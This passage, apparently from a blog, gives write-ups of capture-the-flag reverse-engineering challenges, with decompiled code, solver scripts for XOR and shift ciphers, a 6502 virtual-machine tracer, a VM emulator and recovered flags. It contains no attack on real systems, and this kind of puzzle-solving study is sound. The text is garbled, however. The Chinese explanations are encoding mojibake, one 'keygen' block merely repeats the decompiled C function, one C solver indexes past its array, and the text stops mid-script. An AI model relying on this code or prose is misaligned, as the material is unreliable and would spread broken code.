<p>å¯¹è¾“å…¥çš„flagè¿›è¡Œ32ä½å°ç«¯åºå‚¨å­˜ ç„¶åæ ¹æ®å½“å‰æ•°æ®å—çš„æ­£è´Ÿ(æœ€é«˜ä½)é€‰æ‹©è¿›è¡Œå·¦ç§»1ä½è¿˜æ˜¯å·¦ç§»åå†å¼‚æˆ– è¿™ä¸ªå¼‚æˆ–ä¼šä½¿å·¦ç§»åæœ€åä¸€ä½ç”±0å˜æˆ1 ç”±æ­¤å‚¨å­˜å› å·¦ç§»ä¸¢å¤±çš„æ•°æ® æ®æ­¤å†™å‡ºkeygen å‘ç°é‚£ä¸ªæ§åˆ¶æµæ··æ·†ç¡®å®å°±æ˜¯ä¸€ä½ä¸€ä½å¯¹æ¯”:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> __int8 enc[] = &#123;<span class="number">0xB4</span>, <span class="number">0xBB</span>, <span class="number">0xD8</span>, <span class="number">0xEB</span>, <span class="number">0xD0</span>, <span class="number">0x6E</span>, <span class="number">0xAB</span>, <span class="number">0xCA</span>, <span class="number">0x65</span>, <span class="number">0x8E</span>, </span><br><span class="line">  <span class="number">0x4B</span>, <span class="number">0xE9</span>, <span class="number">0x4D</span>, <span class="number">0xD4</span>, <span class="number">0x4A</span>, <span class="number">0xF3</span>, <span class="number">0x7D</span>, <span class="number">0x29</span>, <span class="number">0xC2</span>, <span class="number">0xF9</span>, </span><br><span class="line">  <span class="number">0x95</span>, <span class="number">0x89</span>, <span class="number">0xA4</span>, <span class="number">0x85</span>, <span class="number">0x9D</span>, <span class="number">0xCD</span>, <span class="number">0xDF</span>, <span class="number">0x77</span>, <span class="number">0xFD</span>, <span class="number">0x45</span>, </span><br><span class="line">  <span class="number">0xCB</span>, <span class="number">0x5D</span>, <span class="number">0x7D</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x4B</span>, <span class="number">0xBC</span>, <span class="number">0xF6</span>, <span class="number">0x7C</span>, <span class="number">0xF3</span>, </span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x42</span>, <span class="number">0xF5</span>, <span class="number">0xD2</span>, <span class="number">0xDD</span>, <span class="number">0xE3</span>, <span class="number">0x56</span>, <span class="number">0xAE</span>&#125;;</span><br><span class="line">    __int64 d = <span class="number">0x000000000033077D</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)&#123;</span><br><span class="line">        enc[i] ^= <span class="number">0x25</span>;</span><br><span class="line">        enc[i] -= <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> __int64 enc_[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)&#123;</span><br><span class="line">        enc_[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;</span><br><span class="line">            enc_[i] |= (__int64)enc[<span class="number">8</span> * i + j] &lt;&lt; (j * <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">64</span>; ++j)&#123;</span><br><span class="line">            <span class="keyword">if</span>(enc_[i] &amp; <span class="number">1</span>)&#123;</span><br><span class="line">                enc_[i] ^= d;</span><br><span class="line">                enc_[i] &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">                enc_[i] |= (__int64)(<span class="number">0x8000000000000000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                enc_[i] &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// save the data back to enc with big-ending</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;</span><br><span class="line">            enc[i * <span class="number">8</span> + j] = (enc_[i] &gt;&gt; (j * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, enc[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// begin&#123;Th1s_reverse_pr0blem_may_t@ke_some_time#!&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ä¿„è¯­å­¦ä¹ -é˜²é™æ€åˆ†æ"><a href="#ä¿„è¯­å­¦ä¹ -é˜²é™æ€åˆ†æ" class="headerlink" title="ä¿„è¯­å­¦ä¹  | é˜²é™æ€åˆ†æ"></a>ä¿„è¯­å­¦ä¹  | é˜²é™æ€åˆ†æ</h2><p>ä¸»è¦åŠ å¯†:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_1A1F80</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [esp+D0h] [ebp-54h]</span></span><br><span class="line">  <span class="type">size_t</span> j; <span class="comment">// [esp+DCh] [ebp-48h]</span></span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+E8h] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">44</span>]; <span class="comment">// [esp+F4h] [ebp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_22F0F4);</span><br><span class="line">  qmemcpy(Str, cource, <span class="number">0x25</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= j__strlen(Str); ++i )</span><br><span class="line">    sourc_key[i] = Str[i] - <span class="number">0x72</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= j__strlen(sourc_key); ++j )</span><br><span class="line">    key[j] = sourc_key[j];</span><br><span class="line">  v0 = j__strlen(sourc_key);</span><br><span class="line">  result = sub_19B6D0(table, sourc_key, v0);</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">256</span>; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_table[k] = table[k];</span><br><span class="line">    result = k + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­tableåˆå§‹åŒ–æ˜¯å¹²æ‰°åˆ†æçš„ åé¢å¹¶ä¸ä¼šç”¨åˆ° ä¸»è¦åŠ å¯†æ–¹å¼å°±æ˜¯æ ¹æ®keyå¯¹flagè¿›è¡ŒåŠ å‡è¿ç®— ä»¥ä¸‹æ˜¯keygen:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> sub_1A1F80()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v0; // eax</span><br><span class="line">  <span class="built_in">int</span> result; // eax</span><br><span class="line">  <span class="built_in">int</span> k; // [esp+D0h] [ebp-54h]</span><br><span class="line">  size_t j; // [esp+DCh] [ebp-48h]</span><br><span class="line">  size_t i; // [esp+E8h] [ebp-3Ch]</span><br><span class="line">  char Str[<span class="number">44</span>]; // [esp+F4h] [ebp-30h] BYREF</span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_22F0F4);</span><br><span class="line">  qmemcpy(Str, cource, 0x25u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= j__strlen(Str); ++i )</span><br><span class="line">    sourc_key[i] = Str[i] - <span class="number">0x72</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= j__strlen(sourc_key); ++j )</span><br><span class="line">    key[j] = sourc_key[j];</span><br><span class="line">  v0 = j__strlen(sourc_key);</span><br><span class="line">  result = sub_19B6D0(table, sourc_key, v0);</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">256</span>; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_table[k] = table[k];</span><br><span class="line">    result = k + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># flag&#123;Russian_is_so_easy&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="çº¢ç™½æœº-ç®€å•è™šæ‹Ÿæœº"><a href="#çº¢ç™½æœº-ç®€å•è™šæ‹Ÿæœº" class="headerlink" title="çº¢ç™½æœº | ç®€å•è™šæ‹Ÿæœº"></a>çº¢ç™½æœº | ç®€å•è™šæ‹Ÿæœº</h2><p>ä½¿ç”¨çš„æ˜¯6502è™šæ‹Ÿæœº ç›´æ¥æ¨¡æ‹Ÿå…¶è¿è¡Œ(æˆ–è€…åˆ†æåæ‰‹ç”»ä¹Ÿè¡Œ) è¿™é‡Œå·²ç»ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ›¿æ¢è¿‡åŸæ¥çš„6502æŒ‡ä»¤</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">flag = np.array(Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;6502.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    now_color = <span class="number">255</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> offset &lt;= <span class="number">0x3FF</span>:</span><br><span class="line">        flag[<span class="built_in">int</span>(offset / <span class="number">32</span>), offset % <span class="number">32</span>] = now_color</span><br><span class="line">        offset += <span class="number">1</span></span><br><span class="line">    offset = <span class="number">1</span></span><br><span class="line">    lines = f.readlines()</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(lines)):</span><br><span class="line">        lines[i] = lines[i].replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">36</span>:]:</span><br><span class="line">        <span class="keyword">if</span> line[:<span class="number">8</span>] == <span class="string">&quot;color = &quot;</span>:</span><br><span class="line">            now_color = <span class="built_in">int</span>(line[<span class="number">8</span>:], <span class="number">16</span>) * <span class="number">255</span></span><br><span class="line">        <span class="keyword">if</span> line[:<span class="number">10</span>] == <span class="string">&quot;load color&quot;</span>:</span><br><span class="line">            flag[<span class="built_in">int</span>((offset + <span class="built_in">int</span>(line[<span class="number">15</span>:<span class="number">18</span>], <span class="number">16</span>) - <span class="number">0x200</span>) / <span class="number">32</span>), offset % <span class="number">32</span>] = now_color</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(now_color, offset, <span class="built_in">int</span>(offset / <span class="number">32</span>), offset % <span class="number">32</span>, count)</span><br><span class="line">        <span class="keyword">if</span> line == <span class="string">&quot;offset += 1&quot;</span>:</span><br><span class="line">            offset += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> line[:<span class="number">8</span>] == <span class="string">&quot;offset =&quot;</span>:</span><br><span class="line">            offset = <span class="built_in">int</span>(line[<span class="number">8</span>:], <span class="number">16</span>)</span><br><span class="line">plt.figure(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">plt.imshow(flag)</span><br><span class="line">plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-110639-3.png" alt="image-20240206144338244"></p>
<h2 id="stick-game-jsæ··æ·†"><a href="#stick-game-jsæ··æ·†" class="headerlink" title="stick game | jsæ··æ·†"></a>stick game | jsæ··æ·†</h2><p>jsä¸­æ¸¸æˆçš„ä¸»è¦é€»è¾‘è¢«æ··æ·†:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-110639-4.png" alt="image-20240206144537026"></p>
<p>ç”¨ç½‘ç«™åæ··æ·†:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-110639-5.png" alt="image-20240206144616490"></p>
<p>ç›´æ¥æ‰¾åˆ°flag<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-145028.png" alt="image-20240206144649583"></p>
<h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p>ä¸»è¦é€»è¾‘å°±æ˜¯å°†flagåˆ†å‰åä¸¤åŠåŠ å¯† ç”¨keyæ­£ç€å¼‚æˆ–ä¸€éå†å€’ç€æŠ‘æˆ–ä¸€é å†äº¤æ¢å‰åä½¿ç”¨çš„keyå†é‡å¤ä¸Šè¿°è¿‡ç¨‹ keygen:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">52</span>,  <span class="number">49</span>,  <span class="number">56</span>,  <span class="number">48</span>,  <span class="number">51</span>,  <span class="number">56</span>,  <span class="number">55</span>,  <span class="number">51</span>,  <span class="number">54</span>,  <span class="number">50</span>, </span><br><span class="line">   <span class="number">53</span>,  <span class="number">57</span>,  <span class="number">48</span>,  <span class="number">49</span>,  <span class="number">51</span>,  <span class="number">54</span>,  <span class="number">51</span>,  <span class="number">48</span>,  <span class="number">57</span>,  <span class="number">50</span>, </span><br><span class="line">   <span class="number">54</span>,  <span class="number">48</span>,  <span class="number">54</span>,  <span class="number">54</span>,  <span class="number">51</span>,  <span class="number">50</span>,  <span class="number">55</span>,  <span class="number">56</span>,  <span class="number">55</span>,  <span class="number">57</span>, </span><br><span class="line">   <span class="number">52</span>,  <span class="number">55</span>]</span><br><span class="line">key1 = [<span class="number">54</span>,  <span class="number">51</span>,  <span class="number">50</span>,  <span class="number">57</span>,  <span class="number">48</span>,  <span class="number">55</span>,  <span class="number">57</span>,  <span class="number">52</span>,  <span class="number">50</span>,  <span class="number">48</span>, </span><br><span class="line">   <span class="number">55</span>,  <span class="number">55</span>,  <span class="number">49</span>,  <span class="number">53</span>,  <span class="number">53</span>,  <span class="number">56</span>,  <span class="number">55</span>,  <span class="number">54</span>,  <span class="number">55</span>,  <span class="number">57</span>, </span><br><span class="line">   <span class="number">54</span>,  <span class="number">50</span>,  <span class="number">49</span>,  <span class="number">51</span>,  <span class="number">56</span>,  <span class="number">54</span>,  <span class="number">55</span>,  <span class="number">51</span>,  <span class="number">53</span>,  <span class="number">48</span>, </span><br><span class="line">   <span class="number">48</span>,  <span class="number">48</span>]</span><br><span class="line">hbkey = key[<span class="number">0</span>:<span class="number">16</span>] + [<span class="number">0</span>]</span><br><span class="line">qmkey = key[<span class="number">16</span>:<span class="number">32</span>] + [<span class="number">0</span>]</span><br><span class="line">enc = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;`agh&#123;^bvuwTooahlYocPtmyiijj|ek&#x27;p&quot;</span>]</span><br><span class="line">qm = enc[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">hb = enc[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    qm[i] ^= qmkey[<span class="number">16</span> - i]</span><br><span class="line">    qm[i] ^= hbkey[<span class="number">16</span> - i]</span><br><span class="line">    hb[i] ^= hbkey[<span class="number">16</span> - i]</span><br><span class="line">    hb[i] ^= qmkey[<span class="number">16</span> - i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    qm[i] ^= qmkey[i]</span><br><span class="line">    qm[i] ^= hbkey[i]</span><br><span class="line">    hb[i] ^= hbkey[i]</span><br><span class="line">    hb[i] ^= qmkey[i]</span><br><span class="line">hbkey = key1[<span class="number">0</span>:<span class="number">16</span>] + [<span class="number">0</span>]</span><br><span class="line">qmkey = key1[<span class="number">16</span>:<span class="number">32</span>] + [<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    qm[i] ^= qmkey[<span class="number">16</span> - i]</span><br><span class="line">    qm[i] ^= hbkey[<span class="number">16</span> - i]</span><br><span class="line">    hb[i] ^= hbkey[<span class="number">16</span> - i]</span><br><span class="line">    hb[i] ^= qmkey[<span class="number">16</span> - i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    qm[i] ^= qmkey[i]</span><br><span class="line">    qm[i] ^= hbkey[i]</span><br><span class="line">    hb[i] ^= hbkey[i]</span><br><span class="line">    hb[i] ^= qmkey[i]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> qm + hb])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;Virus_gonna_be_terminated!&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="babyvm-vmre"><a href="#babyvm-vmre" class="headerlink" title="babyvm | vmre"></a>babyvm | vmre</h2><p>æ¨¡æ‹Ÿè™šæ‹Ÿæœºè¿è¡Œè¿‡ç¨‹ :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># emulate the procees of vm</span></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;opcode.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> opcode:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;opcode.vm&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> opcode_file:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;memory.vm&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> memory:</span><br><span class="line">            all_memory = []</span><br><span class="line">            input_text = []</span><br><span class="line">            output_text = []</span><br><span class="line">            data = memory.read(<span class="number">4</span>)</span><br><span class="line">            <span class="keyword">while</span>(data):</span><br><span class="line">                all_memory.append(unpack(<span class="string">&quot;&lt;I&quot;</span>, data)[<span class="number">0</span>])</span><br><span class="line">                data = memory.read(<span class="number">4</span>)</span><br><span class="line">            now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">            in_pointer = <span class="number">0</span></span><br><span class="line">            out_pointer = <span class="number">0</span></span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            count_sum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span>(now_op):</span><br><span class="line">                <span class="built_in">print</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">1</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">3</span> * <span class="number">4</span>)</span><br><span class="line">                    all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">0</span>:<span class="number">4</span>])[<span class="number">0</span>]] = all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]] + all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]]</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">3</span> * <span class="number">4</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;sum[&quot;</span> + <span class="built_in">str</span>(count_sum - <span class="number">8</span>) + <span class="string">&quot;] == &quot;</span> + <span class="built_in">str</span>(all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                    count_sum += <span class="number">1</span></span><br><span class="line">                    all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">0</span>:<span class="number">4</span>])[<span class="number">0</span>]] = all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]] - all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]]</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">3</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">3</span> * <span class="number">4</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;key[&quot;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(count / <span class="number">20</span>)) +<span class="string">&quot;][&quot;</span> + <span class="built_in">str</span>(count % <span class="number">20</span>) + <span class="string">&quot;] == &quot;</span> + <span class="built_in">str</span>(all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]]) + <span class="string">&quot;, &quot;</span>)</span><br><span class="line">                    count += <span class="number">1</span></span><br><span class="line">                    all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">0</span>:<span class="number">4</span>])[<span class="number">0</span>]] = all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]] * all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]]</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">4</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">3</span> * <span class="number">4</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, (now_op[<span class="number">0</span>:<span class="number">4</span>]))[<span class="number">0</span>]) + <span class="string">&quot;] = mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]) + <span class="string">&quot;] / mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, (now_op[<span class="number">0</span>:<span class="number">4</span>]))[<span class="number">0</span>]) + <span class="string">&quot;] = mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]) + <span class="string">&quot;] / mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]) + <span class="string">&quot;]\n&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">0</span>:<span class="number">4</span>])[<span class="number">0</span>]) + <span class="string">&quot;] = &quot;</span> + <span class="built_in">str</span>(all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">0</span>:<span class="number">4</span>])[<span class="number">0</span>]]), end = <span class="string">&quot;, &quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">0</span>:<span class="number">4</span>])[<span class="number">0</span>]) + <span class="string">&quot;] = &quot;</span> + <span class="built_in">str</span>(all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">0</span>:<span class="number">4</span>])[<span class="number">0</span>]]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]) + <span class="string">&quot;] = &quot;</span> + <span class="built_in">str</span>(all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]]), end = <span class="string">&quot;, &quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]) + <span class="string">&quot;] = &quot;</span> + <span class="built_in">str</span>(all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]) + <span class="string">&quot;] = &quot;</span> + <span class="built_in">str</span>(all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]]))</span><br><span class="line">                    opcode.write(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]) + <span class="string">&quot;] = &quot;</span> + <span class="built_in">str</span>(all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                    all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">0</span>:<span class="number">4</span>])[<span class="number">0</span>]] = all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]] / all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op[<span class="number">8</span>:<span class="number">12</span>])[<span class="number">0</span>]]</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#reset the in pointer</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">5</span>:</span><br><span class="line">                    in_pointer = <span class="number">0</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;in_pointer = 0&quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;in_pointer = 0\n&quot;</span>)</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span 